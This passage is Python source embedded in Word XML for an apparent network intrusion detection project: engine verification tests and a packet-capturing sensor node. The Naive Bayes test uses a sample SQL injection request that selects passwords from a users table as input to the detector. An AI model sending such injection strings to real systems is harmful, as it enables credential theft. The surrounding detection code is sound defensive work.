      </w:r>
    </w:p>
    <w:p w14:paraId="632D43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stats = z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A943C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3E122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Feed VARIABLE normal traffic (to generate a Standard Deviation &gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0511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If standard deviation is 0, Z-Score is 0. We need variance!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307E03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traffic = [10, 12, 11, 10, 13, 9, 11, 12, 10, 11]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4979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pps in traffic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36BC60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stats.update(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DAF4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1F557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mean, std = stats.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1EBF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 Baseline Established -&gt; Mean: {mean:.2f}, StdDev: {std:.2f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32981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FF1D9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Feed Attack Traffic (100 packets/sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2AF6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packet_count = 100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2737EE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z = (packet_count - mean) / std if std &gt; 0 else 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B8CD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 Attack Traffic (100 pps) -&gt; Z-Score: {z:.2f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B728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897FC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z &gt; 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C643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[PASS] Z-Score correctly flagged anomaly.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1629DB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5ECA50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 [FAIL] Z-Score failed to flag anomaly. (Check standard deviation)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129225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C690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5BA450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TEST 2: Behavior Engine (KNN)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B80C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34CF52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print("\n[TEST 2] Testing KNN Engine (Port Scan Detection)...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1092B2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66C81F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knn_engine = knn.KNNMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266ACC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6A3FA8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Simulate Port Scan: 100 packets, 100 unique ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272BEE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_ = knn_engine.classify(unique_ports=100, packet_count=100)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7ACC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Input: 100 Unique Ports / 100 Packets -&gt; Verdict: {verdict}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FD63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63D157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verdict == "Scan":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71246F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[PASS] KNN correctly identified Port Scan.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD4C1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061DCD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[FAIL] KNN failed to identify Port Scan.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4055BA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 as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DEAB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[ERROR] KNN module failed: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0077E2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3BC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# ---------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFE1D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TEST 3: Payload Engine (Naive Bayes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BC8F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59DD8F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print("\n[TEST 3] Testing Naive Bayes Engine (SQL Injection)...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C3CD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29BCF4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hasattr(naive_bayes, 'PayloadMonitor'):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EC22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print(f"   [DEBUG] naive_bayes module content: {dir(naive_bayes)}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE6A3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[ERROR] 'PayloadMonitor' class not found in naive_bayes.py!")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641A8E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        Please check if you copied naive_bayes.py correctly.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E56E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21DEFC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nb = naive_bayes.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029452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0F30F4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Simulate SQL Injection Payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641BBC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payload = b"GET /?q=UNION SELECT password FROM users"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172D92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verdict, score, words = nb.classify(payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6742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print(f"   Input: '{payload.decode()}'")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765C22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print(f"   Verdict: {verdict} | Score: {score} | Words: {words}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B348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43EAFE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verdict == "Malicious":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292EBC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   [PASS] Naive Bayes correctly identified SQL Injection.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0105B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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CD01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   [FAIL] Naive Bayes failed to identify SQL Injection.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC122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 as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E57D7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[ERROR] Naive Bayes module failed: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEAF7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30E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16E54F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TEST 4: Reputation Engine (Bloom Filter)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761CA8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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447087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print("\n[TEST 4] Testing Bloom Filter (Blacklist)...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0E26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35DDB4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bloom.BloomFilter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1552F6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bad_ip = "192.168.1.66"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD7C5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bf.add(bad_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CA46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150F7B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exists = bf.check(bad_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1471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Added '{bad_ip}' to Blacklist.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416082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Checking '{bad_ip}' -&gt; {exists}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8D6E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02E5B6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exists:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A72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[PASS] Bloom Filter correctly blocked IP.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44440D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01D552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[FAIL] Bloom Filter failed to block IP.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBD34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 as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488F26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[ERROR] Bloom Filter module failed: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B30C0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E20D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print("\n================================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343E7B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 VERIFICATION COMPLETE")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C23DE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print("================================================================")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67254E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3EB4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9967A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test_engines()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE78779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Sensor Node (Capture, Parse, Dispatch)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09452585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src/sensor_node/sensor.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBD1CD5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(413 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E07F6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52789A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"""MANTIS sensor node: raw capture, engine fan-out, response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D02CB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510E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Architecture (Chapter 4.1.2, producer/consumer threading model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B4747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DE542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sniffer thread   AF_PACKET raw socket -&gt; bounded queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3A4A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analyzer thread  queue -&gt; PacketParser -&gt; 5 engines -&gt; AlertDispatcher</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4E77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3FE8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queue decouples the two so that machine-learning work in the analyzer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D58A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cannot slow the socket drain, which is what previously caused packet loss</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083BBC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under load (bug B-01). On overflow the sniffer drops rather than blocks, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B5E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capture rate degrades gracefully instead of stalling the kernel buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C04D6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A14B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Per-packet engines (Bloom reputation, Naive Bayes payload) run on every frame.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E544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Per-interval engines (Z-Score volume, KNN port spread, K-Means novelty) run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04770F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once per second on aggregated counters, because their features are rates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669114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66CEE45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1B3D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glob</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72075B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1F4416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import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12151A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queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB662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45E0D9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5DFE06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754BD2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8CD26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39D4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sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5296743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F56B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dashboard_ui.reporting as reporting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1228E6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engines.bloom as bloom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4627A1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engines.kmeans as kmeans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796677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engines.knn as knn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFF85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engines.naive_bayes as naive_bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B567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engines.z_score as z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354C70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sensor_node.dispatcher as dispatcher_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508B4E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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B47B5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utils.active_defense as active_defense</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5903B9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utils.logger as logger_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F032F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utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384B90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45F337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utils.privacy as privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA00C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utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D00244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7D141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7844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SensorNode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E3A2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stats_queue=None, alert_queue=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E614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brain_file=None, config=None, forward_alerts=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B80F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 or CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E32C4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self.stats_queue = stats_queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C99AD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self.alert_queue = alert_queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB420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self.brain_file = brain_file or self.config.brain_file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5BD95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AD38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self.packet_queue = queue.Queue(maxsize=self.config.queue_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5C1C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ACEB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---- detection engines (all share the DetectionEngine interface) ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C035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self.stats_engine = z_score.MinimalistStats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CD27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window_size=self.config.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A79E1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threshold=self.config.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D4E6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min_pps=self.config.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329A84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required_consecutive=self.config.ddos_consecutive_intervals)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD072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self.knn_engine = knn.KNNMonitor(k=self.config.knn_k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C29E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self.payload_engine = naive_bayes.PayloadMonitor(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3487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confidence_threshold=self.config.payload_confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763DF1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self.kmeans_engine = kmeans.KMeansMonitor(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4158D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k=self.config.kmeans_k, learning_rate=self.config.kmeans_alpha)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0842F4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self.blacklist = bloom.BloomFilter(size=self.config.bloom_size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB312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hash_count=self.config.bloom_hashes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE737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48D8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threat intelligence: file-based feed, falling back to a seed pair</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49975D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self.config.blacklist_file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED97C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self.blacklist.load_feed(self.config.blacklist_file) &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087753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self._seed_blacklist()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BB3E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7E4ED2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self._seed_blacklist()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E578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4A0C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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C96E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self.reporter = reporting.ReportGenerator()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9C5F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self.ips = active_defense.ActiveDefense(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D039B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whitelist=self.config.block_whitelist)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E61006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58EA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self.audit_log = logger_mod.Logger(self.config.log_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2016BF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config=self.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23AB10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self.remote = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AB08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forward_alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606565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self.remote = logger_mod.UDPSender(self.config.udp_host,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF711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self.config.udp_port,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D54CB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config=self.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="590B04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BA9D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self.dispatcher = dispatcher_mod.AlertDispatcher(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104819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self.config, reporter=self.reporter, alert_queue=alert_queue,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390D16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logger=self.audit_log, remote=self.remote, defense=self.ips)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4615B5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E638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optional live pcap capture, verifiable in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200DDF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self.pcap_writer = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3E01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self.config.pcap_file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C666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0E5D25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self.pcap_writer = pcap.PcapWriter(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266644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self.config.pcap_file, snaplen=self.config.pcap_snaplen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6355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print("[*] writing capture to %s (snaplen %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C9D7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% (self.config.pcap_file, self.config.pcap_snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6EA0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OSError as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321CC2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print("[!] could not open pcap file:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1451238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CD49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packet_store.STORE = packet_store.PacketStore(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6976D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maxlen=self.config.packet_buffer)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1B40B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8EF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self.import_brain_state()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0BA2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6322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self.packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424213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self.unique_ports = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE9B2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self.source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F72BF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self.scan_active_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0039F4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self.last_time = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A53F0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self.is_running = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="114452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self.dropped = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052738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self.started_at = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC10B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E17C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_seed_blacklist(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796DEF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("192.168.1.200", "10.0.0.66"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099B45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self.blacklist.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C5FB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54A3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capture -------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C10E0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_sniffer_thread(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E80A2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pull packets off the wire as fast as possible, drop on overflow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D3D9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54FCF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 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51DBF4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socket.ntohs(0x0003))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E429C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PermissionError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8DA4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need sudo for raw sockets")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E10F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self.is_running = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152E7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327022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AttributeError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DC0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AF_PACKET unavailable (Linux only). "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1D3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"Use replay.py for offline analysis on this platform.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0452A1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self.is_running = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F82E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7C1C13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27E8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sniffer up")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FC8D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self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CACD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0F29D4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raw, _ = s.recvfrom(65535)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D0D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30D3FE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self.packet_queue.put_nowait(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD377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queue.Full:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8E12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self.dropped += 1  # analyzer is too slow - drop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6090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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A3B6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self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA3CC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print("[!] sniffer error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEE4F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5E44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analysis ------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F69A1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_analyzer_thread(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1276C4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analyzer up - 5 engines, dispatcher armed")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716E07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self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25142B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11D93F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raw = self.packet_queue.get(timeout=0.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566452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queue.Empty:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B09C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self._run_timer_checks()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F71B2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57D0E8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872F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self._run_timer_checks()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513B78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89A8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self.pcap_writer is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490887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674220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self.pcap_writer.write(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDCE5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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6921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pass  # never let forensics break detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B45429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18D8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 = self.parser.parse(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733955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 is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A2F6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7BE631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0660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ignore our own dashboard traffic so the sensor cannot alert on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B8CB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the analyst watching it (self-noise feedback loop)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106F85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(pkt["sport"] in (self.config.http_port, self.config.udp_port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216881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or pkt["dport"] in (self.config.http_port,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413696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self.config.udp_port)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662F4F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4018EFF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B9AB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Interval counters must describe the same successfully parsed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FBA5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in-scope traffic. Counting every raw Ethernet frame here used to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F6B2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produce impossible observations such as PPS &gt; 0 with zero ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1FDC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self.packet_count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0057D9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src = pkt["src"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45345B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source_observation = self.source_stats.setdefault(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AE20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src, {"packets": 0, "ports": set()})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27205F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source_observation["packets"] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200CFA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E3FD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--- Bloom Filter: IP reputation, O(k) per packet ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417D54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rep = self.blacklist.analyse(src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002264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rep.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42732E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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D043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"BLACKLISTED IP DETECTED: %s" % src,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC441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kind="blacklist", src_ip=src, confidence=rep.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63238E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engine="Bloom Filter (reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661BC2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response_status=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FF30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self._record_packet(raw, pkt, "BLACKLIST")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F5B6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7E5B0E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4EE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pkt["dport"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3589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self.unique_ports.add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE929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source_observation["ports"].add(pkt["dport"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F854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D0D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--- Naive Bayes: Layer 7 payload inspection ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730120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verdict_tag = "clean"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D50F0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pkt["payload"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752797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verdict = self.payload_engine.analyse(pkt["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFD0E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verdict.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2918D0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verdict_tag = "MALICIOUS"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380FCF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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A29D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"MALICIOUS PAYLOAD! Confidence: %.2f%% Keywords: %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667B1E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% (verdict.confidence * 100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C50AC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verdict.detail["keywords"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF915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src_ip=src, confidence=verdict.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B081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payload=pkt["payload"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096407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engine="Naive Bayes (payload)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D856A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64E6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self._record_packet(raw, pkt, verdict_tag)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F3A65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402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_run_timer_checks(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A52D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now = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665E14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(now - self.last_time) &lt; 1.0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424D17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227B445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FA85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pps = self.packet_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDD27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 = len(self.unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453B54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source_stats = self.source_stats</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101D04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dominant_src = self._dominant_source(source_stats, pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444490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6790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Z-Score: volumetric flood ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412B0B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zv = self.stats_engine.analyse(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6BA1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 = zv.detail["mean"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B19A1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 = zv.detail["z_score"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014F17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Dispatch once when a sustained DDoS episode begins. The active flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5235A5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remains true for dashboard status without flooding the event stream</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F227D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with a duplicate alert every second.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193282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zv.detail["new_threat"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D017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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673122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 DETECTED! Z-Score: %.2f (PPS: %d)" % (z, pps),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F7FE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kind="ddos", src_ip=dominant_src, confidence=zv.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFD50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engine="Z-Score (statistical)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37157B7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2E84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KNN: per-source port-scan behaviour ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699888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current_scan_sources = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAB11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src, observation in source_stats.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CBD39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src_packets = observation["packets"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52563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src_ports = len(observation["ports"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B9D0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kv = self.knn_engine.analyse(src_ports, src_packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608E66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kv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520F9E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current_scan_sources.add(src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C43D0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src not in self.scan_active_sources:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A01A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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6921A0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"PORT SCAN DETECTED! (Unique Ports: %d/sec)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A11B3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% src_ports,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240FC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kind="scan", src_ip=src, confidence=kv.confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D82FB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engine="KNN (behavioural)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E7B8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self.scan_active_sources = current_scan_sources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788EF5B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747A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K-Means: novelty / behavioural drift ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528548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cv = self.kmeans_engine.analyse(pps, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3641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cv.is_threat and not current_scan_sources and not zv.is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6272EF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self.dispatcher.dispatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5415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"ANOMALY DETECTED (Cluster %d)! Suspicious activity."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC0FB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% cv.detail["cluster"], kind="anomaly",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48743B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src_ip=dominant_src, confidence=cv.confidence,</w:t>
